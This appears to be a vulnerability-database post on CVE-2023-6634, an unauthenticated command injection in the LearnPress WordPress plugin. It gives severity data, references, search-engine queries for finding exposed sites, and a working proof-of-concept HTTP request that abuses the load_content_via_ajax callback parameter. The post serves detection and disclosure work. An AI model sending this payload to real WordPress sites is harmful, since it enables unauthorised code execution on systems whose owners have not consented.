---
layout: post
cve_id: CVE-2023-6634
title: LearnPress < 4.2.5.8 - Remote Code Execution
pcap: true
pcap_path: /pcaps/2023/CVE-2023-6634.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-6634.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: critical
impact: 'Unauthenticated attackers can exploit command injection through the get_content
  function using call_user_func to execute arbitrary public functions and achieve
  remote code execution on WordPress installations.

  '
remediation: Fixed in 4.2.5.8
reference:
- https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/learnpress/learnpress-4257-command-injection
- https://wpscan.com/vulnerability/909580f4-1306-4e61-ac7d-e7a2eb0961f8/
- https://nvd.nist.gov/vuln/detail/CVE-2023-6634
- https://plugins.trac.wordpress.org/changeset/3013957/learnpress
- https://www.wordfence.com/threat-intel/vulnerabilities/id/21291ed7-cdc0-4698-9ec4-8417160845ed?source=cve
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-6634
  cwe-id: CWE-77
  epss-score: 0.91594
  epss-percentile: 0.99656
  cpe: cpe:2.3:a:thimpress:learnpress:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 3
  vendor: thimpress
  product: learnpress
  framework: wordpress
  shodan-query: http.html:/wp-content/plugins/learnpress
  fofa-query: body=/wp-content/plugins/learnpress
  publicwww-query: /wp-content/plugins/learnpress
tags:
- wpscan
- cve
- cve2023
- wordpress
- wp
- wp-plugin
- learnpress
- rce
- intrusive
- thimpress
- vkev
- vuln
---

## ðŸ” Vulnerability Description
The LearnPress plugin for WordPress is vulnerable to Command Injection in all versions up to, and including, 4.2.5.7 via the get_content function. This is due to the plugin making use of the call_user_func function with user input. This makes it possible for unauthenticated attackers to execute any public function with one parameter, which could result in remote code execution.


## ðŸŒ HTTP Request
```nohighlight
GET /wp-json/lp/v1/load_content_via_ajax/?callback={"class"%3a"LP_Debug","method"%3a"var_dump"}&args="38F2tbd5gwDJWRoUWQPNL6JfVrm" HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

